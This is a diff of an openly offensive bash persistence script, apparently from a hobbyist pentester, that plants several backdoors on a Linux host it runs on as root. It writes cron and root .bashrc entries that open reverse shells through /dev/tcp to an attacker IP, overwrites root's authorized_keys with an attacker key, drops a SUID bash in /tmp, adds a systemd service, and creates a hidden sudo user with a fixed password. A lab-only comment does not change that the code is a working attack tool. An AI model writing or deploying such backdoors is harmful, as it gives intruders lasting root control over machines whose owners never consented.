@@ -3,21 +3,26 @@
 # Created by pwnk1t 
 # https://www.youtube.com/@pwnk1t
 # this script will create multiple backdoors
-# All you need is your VPN IP and you SSH-Key
+# only use this in allowed enviroment 
+# tested&worked on: Shrek 
 
+
+if [ "$EUID" -ne 0 ]; then
+    echo "Run as root"
+    exit
+fi
 
 clear
 
 echo "[💀] Installing persistence..."
 
-sleep 1
 
-read -p "YOUR IP: " IP
+read -p "Hacker IP: " IP
 
 sleep 2
 
 ################################
-# CRON BACKDOOR
+#        CRON BACKDOOR         #
 ################################
 
 echo "[+] creating cron backdoor"
@@ -27,7 +32,7 @@ echo "*/2 * * * * root bash -c 'bash -i >& /dev/tcp/$IP/1337 0>&1'" > /etc/cron.
 sleep 2
 
 ################################
-# ROOT BASHRC
+#        ROOT BASHRC           #
 ################################
 
 echo "[+] creating bashrc backdoor"
@@ -37,16 +42,14 @@ echo "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1' &" >> /root/.bashrc
 sleep 2
 
 ################################
-# SSH KEY BACKDOOR
+#      SSH KEY BACKDOOR        #
 ################################
 
 echo "[+] installing ssh key"
 
 read -p "Paste SSH public key: " SSHKEY
 
-mkdir -p /root/.ssh
-
-echo "$SSHKEY" >> /root/.ssh/authorized_keys
+echo "$SSHKEY" > /root/.ssh/authorized_keys
 
 chmod 600 /root/.ssh/authorized_keys
 
@@ -55,7 +58,7 @@ chmod 700 /root/.ssh
 sleep 2 
 
 ################################
-# SUID SHELL
+#        SUID SHELL            #
 ################################
 
 echo "[+] creating suid shell"
@@ -66,7 +69,7 @@ chmod +s /tmp/rootbash
 sleep 2
 
 ################################
-# SYSTEMD SERVICE
+#        SYSTEMD SERVICE       #
 ################################
 
 echo "[+] creating systemd persistence"
@@ -89,15 +92,34 @@ systemctl start sys-update
 
 sleep 2
 
-echo ""
+################################
+#         HIDDEN USER          # 
+################################
+
+echo "[+] creating hidden user"
+
+useradd -m -s /bin/bash sysbackup
+
+echo "sysbackup:Password123!" | chpasswd
+
+usermod -aG sudo sysbackup 2>/dev/null
+
+echo "[+] user created -> sysbackup:Password123!"
+
+sleep 2
+
 echo "[+] Backdoors installed"
-sleep 2
-echo "[!] /tmp/rootbash -p for suid backdoor" 
-sleep 2
+sleep 1 
+echo "[!] /tmp/rootbash -p for suid backdoor"
+sleep 1
 echo "[!] Open listeners:"
 echo ""
 sleep 1
-echo -e "   \033[96m1337 4444 5555\033[0m"
+echo -e "\033[96m[+] 1337 4444 5555\033[0m"
 sleep 1
+echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
 echo ""
+sleep 1 
+echo "[*]  clean up..."
+sleep 1 
 echo "[💀] created by pwnk1t [💀]"
